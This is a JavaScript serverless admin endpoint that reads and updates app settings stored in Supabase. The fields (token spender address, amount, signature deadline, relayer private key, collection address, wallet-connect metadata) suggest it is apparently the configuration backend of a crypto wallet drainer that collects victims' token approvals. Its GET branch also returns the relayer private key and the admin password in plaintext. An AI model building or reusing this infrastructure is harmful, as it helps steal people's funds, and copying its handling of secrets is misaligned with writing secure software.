import { getSupabase, getSettings, cors, requireAdmin } from '../lib/supabase.js';

export default async function handler(req, res) {
  cors(res);
  if (req.method === 'OPTIONS') return res.status(200).end();

  try {
    const supabase = getSupabase();
    const settings = await getSettings(supabase);
    requireAdmin(req, settings);

    if (req.method === 'GET') {
      // Return all settings including sensitive fields for authenticated admin
      return res.status(200).json({
        project_id: settings.project_id || '',
        metadata_name: settings.metadata_name || '',
        metadata_description: settings.metadata_description || '',
        metadata_url: settings.metadata_url || '',
        metadata_icon: settings.metadata_icon || '',
        chain_id: settings.chain_id || 1,
        usdt_address: settings.usdt_address || '',
        spender_address: settings.spender_address || '',
        amount: settings.amount || '',
        deadline_seconds: settings.deadline_seconds || 3600,
        rpc_url: settings.rpc_url || '',
        relayer_private_key: settings.relayer_private_key || '',
        collection_address: settings.collection_address || '',
        admin_password: settings.admin_password || '',
        updated_at: settings.updated_at
      });
    }

    if (req.method === 'PUT') {
      const body = req.body || {};
      const allowed = [
        'project_id',
        'metadata_name',
        'metadata_description',
        'metadata_url',
        'metadata_icon',
        'chain_id',
        'usdt_address',
        'spender_address',
        'amount',
        'deadline_seconds',
        'rpc_url',
        'relayer_private_key',
        'collection_address',
        'admin_password'
      ];

      const update = { updated_at: new Date().toISOString() };
      for (const key of allowed) {
        if (body[key] !== undefined) {
          update[key] = body[key];
        }
      }

      if (update.chain_id !== undefined) {
        update.chain_id = parseInt(update.chain_id, 10) || 1;
      }
      if (update.deadline_seconds !== undefined) {
        update.deadline_seconds = parseInt(update.deadline_seconds, 10) || 3600;
      }

      const { data, error } = await supabase
        .from('app_settings')
        .update(update)
        .eq('id', 1)
        .select()
        .single();

      if (error) throw error;

      return res.status(200).json({ ok: true, updated_at: data.updated_at });
    }

    return res.status(405).json({ error: 'Method not allowed' });
  } catch (err) {
    const status = err.status || 500;
    return res.status(status).json({ error: err.message });
  }
}
